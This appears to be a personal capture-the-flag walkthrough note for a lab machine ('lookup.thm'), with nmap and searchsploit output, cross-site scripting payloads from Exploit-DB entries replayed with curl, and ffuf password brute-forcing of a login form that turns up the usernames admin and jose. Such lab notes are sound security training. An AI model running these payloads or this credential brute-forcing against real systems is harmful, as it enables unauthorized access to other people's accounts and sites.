# 10.10.230.8

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 d5:56:b3:f3:b2:00:86:2d:6d:15:3a:0e:71:7e:c4:8b (RSA)
| 256 7f:3b:7c:3c:91:bb:71:80:a6:8a:21:af:01:94:09:50 (ECDSA)
|\_ 256 3f:b9:54:e9:29:90:97:be:ec:fe:b2:d0:7e:90:c9:ce (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Did not follow redirect to http://lookup.thm
|\_http-server-header: Apache/2.4.41 (Ubuntu)

searchsploit httpd 2.4

---

Exploit Title | Path

---

Apache 2.4.23 mod_http2 - Denial of Service | linux/dos/40909.py
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution | multiple/webapps/50383.sh
Omnicron OmniHTTPd 1.1/2.4 Pro - Remote Buffer Overflow | windows/remote/19566.c
OmniHTTPd 1.1/2.0.x/2.4 - 'test.php' Sample Application Cross-Site | windows/remote/21753.txt
OmniHTTPd 1.1/2.0.x/2.4 - Sample Application URL Encoded Newline H | windows/remote/21757.txt
OmniHTTPd 1.1/2.0.x/2.4 - test.shtml Sample Application Cross-Site | windows/remote/21754.txt
OpenBSD HTTPd < 6.0 - Memory Exhaustion Denial of Service | openbsd/dos/41278.txt

---

──(root㉿docker-desktop)-[/usr/share/exploitdb/exploits/windows/remote]

# cat 21753.txt

source: https://www.securityfocus.com/bid/5568/info

Cross site scripting vulnerabilities have been reported in multiple sample scripts including with OmniHTTPD. In particular, test.shtml and test.php contain errors.

This type of vulnerability may be used to steal cookies or perform other web-based attacks.

http://localhost/test.php?%3CSCRIPT%3Ealert%28document.URL%29%3C%2FSCRIPT%3E=x
┌──(root㉿docker-desktop)-[/usr/share/exploitdb/exploits/windows/remote]
└─#

# cat 21757.txt

source: https://www.securityfocus.com/bid/5572/info

OmniHTTPD is a webserver for Microsoft Windows operating systems. OmniHTTPD supports a number of CGI extensions which provide dynamic content.

A HTML injection vulnerability has been reported in the '/cgi-bin/redir.exe' sample CGI included with OmniHTTPD. Reportedly, it is possible for an attacker to URL encode the newline character (%0D) and insert malicious HTML code. A vulnerable server receiving a malformed request will return a 302 redirect HTTP response containing the malicious attacker-supplied code.

http://localhost/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E

curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3C
SCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E"

http://localhost/cgi-bin/redir.exe?URL=http://www.yahoo.com/

curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http://www.yahoo.com/"

<SCRIPT>alert(document.URL)</SCRIPT>

# cat 21754.txt

source: https://www.securityfocus.com/bid/5568/info

Cross site scripting vulnerabilities have been reported in multiple sample scripts including with OmniHTTPD. In particular, test.shtml and test.php contain errors.

This type of vulnerability may be used to steal cookies or perform other web-based attacks.

http://localhost/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x
curl -L "http://lookup.thm/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x"

# ffuf

ffuf -w xato-net-10-million-passwords-10000.txt -X POST -u http://lookup.thm/login.php -d 'userna
me=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fs 74

- fw 10 : 응답 본문의 단어 수가 10이면 핕터링
- fs 74 : 응답 사이즈가 74는 필터링

┌──(root㉿codespaces-d5df79)-[/usr/share/seclists/Passwords/Common-Credentials]
└─# ffuf -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=a' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-100000.txt -fs 74 -o /ffuf-passwd.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : POST
:: URL : http://lookup.thm/login.php
:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
:: Data : username=FUZZ&password=a
:: Output file : /ffuf-passwd.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 74

---

admin [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 192ms]
jose [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 194ms]
